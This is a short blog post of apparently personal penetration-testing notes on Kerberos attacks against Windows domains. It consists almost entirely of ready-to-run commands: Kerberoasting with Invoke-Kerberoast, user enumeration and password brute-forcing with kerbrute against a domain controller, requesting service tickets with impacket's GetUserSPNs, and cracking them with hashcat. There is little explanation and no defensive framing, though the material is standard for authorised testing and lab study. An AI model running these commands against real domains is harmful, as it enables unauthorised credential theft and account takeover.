---
layout: post
title:  "kerberos - general"
date:   2022-01-01
categories: windows
---

## invoke

```bash
Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```


## User enumeration - kerbrute

```bash
./kerbrute userenum --domain example.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.10
```

## Brute force user - kerbrute

```bash
./kerbrute bruteuser --domain example.com /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt username --dc 10.10.10.10
```


## Service Principal Name tickets - TGS

```
impacket-GetUserSPNs -request -dc-ip 10.10.10.10 example.com/username
```

- crack tgs with hashcat - windows

```bash
hashcat.exe -m 13100 tgs.txt rockyou.txt --force
```